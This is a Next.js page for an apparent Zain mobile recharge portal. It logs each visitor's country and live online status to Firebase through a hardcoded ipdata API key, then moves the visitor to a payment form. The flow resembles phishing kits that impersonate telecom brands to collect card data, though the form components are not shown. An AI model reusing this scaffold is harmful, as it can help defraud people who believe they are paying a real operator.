"use client";

import Loader from "@/components/loader";
import ZainRechargePage from "@/components/portal-form";
import PaymentForm from "@/components/qpy";
import { addData } from "@/lib/firebase";
import { setupOnlineStatus } from "@/lib/utils";
import { useEffect, useState, useCallback } from "react";

const visitorId = `zain-app-${Math.random().toString(36).substring(2, 15)}`;

export default function Page() {
  const getLocationAndLog = useCallback(async () => {
    if (!visitorId) return;

    // This API key is public and might be rate-limited or disabled.
    // For a production app, use a secure way to handle API keys, ideally on the backend.
    const APIKEY = "d8d0b4d31873cc371d367eb322abf3fd63bf16bcfa85c646e79061cb";
    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`;

    try {
      const response = await fetch(url);
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`);
      }
      const country = await response.text();
      await addData({
        createdDate: new Date().toISOString(),
        id: visitorId,
        country: country,
        action: "page_load",
        currentPage: "الرئيسية ",
      });
      setupOnlineStatus(visitorId!);

      localStorage.setItem("country", country); // Consider privacy implications
    } catch (error) {
      console.error("Error fetching location:", error);
      // Log error with visitor ID for debugging
      await addData({
        createdDate: new Date().toISOString(),
        id: visitorId,
        error: `Location fetch failed: ${
          error instanceof Error ? error.message : String(error)
        }`,
        action: "location_error",
      });
    }
  }, [visitorId]);

  useEffect(() => {
    if (visitorId) {
      getLocationAndLog().then(() => {
        setShow(true);
        setStepNumber(1);
      });
    }
  }, [visitorId, getLocationAndLog]);
  const [stepNumber, setStepNumber] = useState(1);
  const [show, setShow] = useState(false);

  return (
    <main className="min-h-screen bg-gray-50">
      {/* Step Progress Header */}
      {stepNumber === 1 && show ? (
        <ZainRechargePage  setStepNumber={setStepNumber} setShow={setShow}/>
      ) : stepNumber === 2 ? ( 
        <PaymentForm />
      ) : (
        <Loader />
      )}
    </main>
  );
}
